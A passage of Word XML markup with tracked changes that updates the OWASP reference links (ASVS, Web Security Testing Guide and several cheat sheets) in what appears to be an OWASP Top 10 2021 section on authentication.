          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2728"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Application Security Verification Standard: V2 </w:t>
      </w:r>
      <w:del w:id="2729" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Authentication</w:delText>
        </w:r>
      </w:del>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="2730" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>authentication</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2731" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2732" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2733" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">www-project-application-security-verification-standard) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5FA7A4D3" w14:textId="3C596775" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2734" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2735"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Application Security Verification Standard: V3 Session </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Management](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2736" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2737" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">owasp.org/www-project-application-security-verification-standard) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3D8D26F2" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2738" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2739" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2740"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Testing Guide: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Identity</w:t>
      </w:r>
      <w:ins w:id="2741" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(https://</w:t>
      </w:r>
      <w:del w:id="2742" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>owasp.org/</w:t>
      </w:r>
      <w:del w:id="2743" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2744" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>www-project-web-security-testing-guide/stable/4-Web_Application_Security_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing</w:t>
      </w:r>
      <w:del w:id="2745" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2746" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/03-</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Identity_Management</w:t>
      </w:r>
      <w:del w:id="2747" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="3D6B0FDD" w14:textId="263C1ECD" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2748" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and [Authentication](https://www.owasp.org/index.php/</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2749" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>_</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Testing</w:t>
      </w:r>
      <w:del w:id="2750" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>_for_authentication)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2751" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>/README</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:r w:rsidR="004107D9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">  [</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Authentication](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/README) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4F4C69A0" w14:textId="67C8463A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2752" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2753"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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Authentication](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2754" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2755"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2756" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2757" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Authentication_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="2758" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2759" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="417CFEE2" w14:textId="7ED32B9D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2760" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2761"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Credential </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Stuffing](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2762" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2763"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2764" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2765" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Credential_Stuffing_Prevention_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="2766" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2767" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="734B032F" w14:textId="68D0EAA7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2768" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2769"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Forgot </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Password](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2770" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2771"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2772" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2773" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Forgot_Password_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="2774" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2775" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1FC60F2C" w14:textId="2BB92256" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2776" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2777"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Cheat Sheet: Session </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Management](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2778" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>www</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2779"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2780" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>index.php</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2781" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheets</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/Session_Management_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="2782" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2783" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0C40D072" w14:textId="08BC9CE0" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2784" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="2785" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP Automated Threats </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Handbook](</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://</w:t>
      </w:r>
      <w:del w:id="2786" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
